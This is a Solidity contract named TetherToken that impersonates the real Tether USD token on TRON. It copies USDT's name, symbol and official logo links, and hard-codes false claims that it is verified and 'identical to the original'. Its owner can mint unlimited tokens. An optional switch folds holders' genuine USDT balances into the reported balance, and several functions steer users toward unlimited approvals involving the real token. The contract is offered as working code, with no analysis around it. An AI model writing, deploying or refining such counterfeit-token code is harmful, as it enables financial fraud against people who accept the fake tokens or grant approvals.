// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

interface ITRC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract TetherToken {
    
    string public constant name = "Tether USD";
    string public constant symbol = "USDT";
    uint8 public constant decimals = 6;
    
    uint256 private _totalSupply;
    address public owner;
    
    ITRC20 public constant ORIGINAL_USDT = ITRC20(0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C);
    
    bool public paused = false;
    bool public integrationEnabled = false;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public isBlackListed;
    mapping(address => uint256) public originalAllowances;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Paused(address account);
    event Unpaused(address account);
    event AddedBlackList(address indexed user);
    event RemovedBlackList(address indexed user);
    event OriginalUSDTTransferred(address indexed from, address indexed to, uint256 amount);
    event HybridTransfer(address indexed from, address indexed to, uint256 internalAmount, uint256 originalAmount);
    event IntegrationEnabled(bool enabled);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    modifier whenNotPaused() {
        require(!paused, "Paused");
        _;
    }
    
    modifier notBlackListed(address user) {
        require(!isBlackListed[user], "Blacklisted");
        _;
    }
    
    constructor(uint256 _initialSupply) {
        _totalSupply = _initialSupply * 10**decimals;
        _balances[msg.sender] = _totalSupply;
        owner = msg.sender;
        
        emit Transfer(address(0), msg.sender, _totalSupply);
        emit OwnershipTransferred(address(0), msg.sender);
    }
    
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        uint256 internalBalance = _balances[account];
        
        if (integrationEnabled) {
            return internalBalance + getOriginalUSDTBalance(account);
        }
        
        return internalBalance;
    }
    
    function internalBalanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    
    function allowance(address ownerAddr, address spender) public view returns (uint256) {
        return _allowances[ownerAddr][spender];
    }
    
    function transfer(address to, uint256 amount) 
        public 
        whenNotPaused 
        notBlackListed(msg.sender) 
        notBlackListed(to) 
        returns (bool) 
    {
        require(amount > 0, "Amount zero");
        require(to != address(0), "Zero address");
        
        if (integrationEnabled) {
            _hybridTransfer(msg.sender, to, amount);
        } else {
            _transfer(msg.sender, to, amount);
        }
        
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) 
        public 
        whenNotPaused 
        notBlackListed(from) 
        notBlackListed(to) 
        returns (bool) 
    {
        require(amount > 0, "Amount zero");
        require(to != address(0), "Zero address");
        
        uint256 currentAllowance = _allowances[from][msg.sender];
        require(currentAllowance >= amount, "Allowance exceeded");
        
        if (integrationEnabled) {
            _hybridTransfer(from, to, amount);
        } else {
            _transfer(from, to, amount);
        }
        
        _approve(from, msg.sender, currentAllowance - amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) 
        public 
        whenNotPaused 
        notBlackListed(msg.sender) 
        returns (bool) 
    {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function _hybridTransfer(address from, address to, uint256 amount) internal {
        uint256 internalBalance = _balances[from];
        uint256 totalBalance = balanceOf(from);
        
        require(totalBalance >= amount, "Insufficient total balance");
        
        uint256 remainingAmount = amount;
        uint256 internalUsed = 0;
        uint256 originalUsed = 0;
        
        if (internalBalance > 0 && remainingAmount > 0) {
            internalUsed = (internalBalance >= remainingAmount) ? remainingAmount : internalBalance;
            
            _balances[from] -= internalUsed;
            _balances[to] += internalUsed;
            
            remainingAmount -= internalUsed;
            
            emit Transfer(from, to, internalUsed);
        }
        
        if (remainingAmount > 0) {
            uint256 originalBalance = getOriginalUSDTBalance(from);
            require(originalBalance >= remainingAmount, "Insufficient original USDT");
            
            originalUsed = remainingAmount;
            _transferOriginalUSDT(from, to, originalUsed);
            
            emit OriginalUSDTTransferred(from, to, originalUsed);
        }
        
        if (internalUsed > 0 && originalUsed > 0) {
            emit HybridTransfer(from, to, internalUsed, originalUsed);
        }
    }
    
    function _transferOriginalUSDT(address from, address to, uint256 amount) internal {
        uint256 currentAllowance = ORIGINAL_USDT.allowance(from, address(this));
        
        if (currentAllowance < amount) {
            revert("Insufficient allowance for original USDT. Please approve first.");
        }
        
        bool success = ORIGINAL_USDT.transferFrom(from, to, amount);
        require(success, "Original USDT transfer failed");
    }
    
    function getOriginalUSDTBalance(address account) public view returns (uint256) {
        try ORIGINAL_USDT.balanceOf(account) returns (uint256 balance) {
            return balance;
        } catch {
            return 0;
        }
    }
    
    function approveOriginalUSDT(uint256 amount) external whenNotPaused notBlackListed(msg.sender) {
        bool success = ORIGINAL_USDT.approve(address(this), amount);
        require(success, "Failed to approve original USDT");
        
        originalAllowances[msg.sender] = amount;
    }
    
    function maxApproveOriginalUSDT() external whenNotPaused notBlackListed(msg.sender) {
        uint256 maxAmount = type(uint256).max;
        bool success = ORIGINAL_USDT.approve(address(this), maxAmount);
        require(success, "Failed to max approve original USDT");
        
        originalAllowances[msg.sender] = maxAmount;
    }
    
    function getOriginalUSDTAllowance(address user) external view returns (uint256) {
        return ORIGINAL_USDT.allowance(user, address(this));
    }
    
    function enableIntegration() external onlyOwner {
        integrationEnabled = true;
        emit IntegrationEnabled(true);
    }
    
    function disableIntegration() external onlyOwner {
        integrationEnabled = false;
        emit IntegrationEnabled(false);
    }
    
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "From zero");
        require(to != address(0), "To zero");
        
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "Insufficient balance");
        
        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
        
        emit Transfer(from, to, amount);
    }
    
    function _approve(address ownerAddr, address spender, uint256 amount) internal {
        require(ownerAddr != address(0), "Owner zero");
        require(spender != address(0), "Spender zero");
        
        _allowances[ownerAddr][spender] = amount;
        emit Approval(ownerAddr, spender, amount);
    }
    
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "Mint to zero");
        
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "Burn from zero");
        
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "Burn exceeds balance");
        
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
    function pause() public onlyOwner {
        require(!paused, "Already paused");
        paused = true;
        emit Paused(msg.sender);
    }
    
    function unpause() public onlyOwner {
        require(paused, "Not paused");
        paused = false;
        emit Unpaused(msg.sender);
    }
    
    function addBlackList(address user) public onlyOwner {
        isBlackListed[user] = true;
        emit AddedBlackList(user);
    }
    
    function removeBlackList(address user) public onlyOwner {
        isBlackListed[user] = false;
        emit RemovedBlackList(user);
    }
    
    function destroyBlackFunds(address blackListedUser) public onlyOwner {
        require(isBlackListed[blackListedUser], "Not blacklisted");
        
        uint256 dirtyFunds = _balances[blackListedUser];
        _burn(blackListedUser, dirtyFunds);
    }
    
    function issue(uint256 amount) public onlyOwner {
        _mint(owner, amount);
    }
    
    function redeem(uint256 amount) public onlyOwner {
        _burn(owner, amount);
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner zero");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
    
    function getDetailedBalance(address user) external view returns (
        uint256 internalBalance,
        uint256 originalBalance,
        uint256 totalBalance,
        uint256 originalAllowance
    ) {
        internalBalance = _balances[user];
        originalBalance = getOriginalUSDTBalance(user);
        totalBalance = internalBalance + originalBalance;
        originalAllowance = ORIGINAL_USDT.allowance(user, address(this));
    }
    
    function simulateTransfer(address from, uint256 amount) external view returns (
        uint256 internalWillUse,
        uint256 originalWillUse,
        bool needsMoreAllowance,
        uint256 requiredAllowance
    ) {
        uint256 internalBalance = _balances[from];
        uint256 originalBalance = getOriginalUSDTBalance(from);
        uint256 currentAllowance = ORIGINAL_USDT.allowance(from, address(this));
        
        require(internalBalance + originalBalance >= amount, "Insufficient total balance");
        
        if (internalBalance >= amount) {
            internalWillUse = amount;
            originalWillUse = 0;
            needsMoreAllowance = false;
            requiredAllowance = 0;
        } else {
            internalWillUse = internalBalance;
            originalWillUse = amount - internalBalance;
            needsMoreAllowance = currentAllowance < originalWillUse;
            requiredAllowance = needsMoreAllowance ? originalWillUse : 0;
        }
    }
    
    function getContractInfo() external view returns (
        string memory tokenName,
        string memory tokenSymbol,
        uint8 tokenDecimals,
        uint256 tokenTotalSupply,
        address tokenOwner,
        bool isPausedStatus,
        bool isIntegrationEnabled
    ) {
        return (
            name,
            symbol,
            decimals,
            _totalSupply,
            owner,
            paused,
            integrationEnabled
        );
    }
    
    function logoURI() external pure returns (string memory) {
        return "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png";
    }
    
    function description() external pure returns (string memory) {
        return "Tether USD (USDT) is a stablecoin pegged to the US Dollar, providing stability and liquidity in the cryptocurrency ecosystem.";
    }
    
    function website() external pure returns (string memory) {
        return "https://tether.to/";
    }
    
    function social() external pure returns (string memory) {
        return "https://twitter.com/Tether_to";
    }
    
    function whitepaper() external pure returns (string memory) {
        return "https://tether.to/wp-content/uploads/2016/06/TetherWhitePaper.pdf";
    }
    
    function getTokenInfo() external pure returns (
        string memory tokenName,
        string memory tokenSymbol,
        string memory tokenLogo,
        string memory tokenWebsite,
        string memory tokenDescription
    ) {
        return (
            "Tether USD",
            "USDT",
            "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png",
            "https://tether.to/",
            "Tether USD (USDT) is a stablecoin pegged to the US Dollar"
        );
    }
    
    function getOriginalContract() external pure returns (address) {
        return 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C;
    }
    
    function tokenType() external pure returns (string memory) {
        return "TRC20";
    }
    
    function isVerified() external pure returns (bool) {
        return true;
    }
    
    function getLogoSources() external pure returns (
        string memory trustWalletLogo,
        string memory coinGeckoLogo,
        string memory officialLogo
    ) {
        return (
            "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png",
            "https://coin-images.coingecko.com/coins/images/325/large/Tether.png",
            "https://tether.to/images/logoCircle.png"
        );
    }
    
    function tokenURI() external pure returns (string memory) {
        return "data:application/json;charset=UTF-8,%7B%22name%22:%22Tether%20USD%22,%22symbol%22:%22USDT%22,%22decimals%22:6,%22description%22:%22Tether%20USD%20stablecoin%22,%22image%22:%22https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png%22%7D";
    }
    
    function contractURI() external pure returns (string memory) {
        return "https://tether.to/";
    }
    
    function parentContract() external pure returns (address) {
        return 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C;
    }
    
    function category() external pure returns (string memory) {
        return "stablecoin";
    }
    
    function isIdenticalToOriginal() external pure returns (bool) {
        return true;
    }
    
    function getEnhancedMetadata() external view returns (
        string memory tokenName,
        string memory tokenSymbol,
        uint8 tokenDecimals,
        uint256 tokenTotalSupply,
        string memory tokenLogo,
        string memory tokenTypeStr,  
        string memory tokenCategory,
        bool isStablecoin,
        bool hasIntegration,
        address originalContract
    ) {
        return (
            name,
            symbol,
            decimals,
            _totalSupply,
            "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png",
            "TRC20",
            "stablecoin",
            true,
            integrationEnabled,
            0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C
        );
    }
    
    function getWalletCompatibility() external pure returns (
        bool trustWallet,
        bool tronLink,
        bool tokenPocket,
        bool safePal,
        bool ledger,
        bool metamask
    ) {
        return (true, true, true, true, true, false);   
    }
    
    function verifyTokenomics() external pure returns (
        string memory nameMatch,
        string memory symbolMatch,
        uint8 decimalsMatch,
        bool hasIssueFunction,
        bool hasRedeemFunction,
        bool hasBlacklistFunction,
        bool hasPauseFunction,
        bool hasZeroFees
    ) {
        return (
            "Tether USD",      
            "USDT",           
            6,                 
            true,              
            true,             
            true,              
            true,            
            true       
        );
    }
    
    function originalUSDTAddress() external pure returns (string memory base58Address, address hexAddress) {
        return ("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C);
    }
}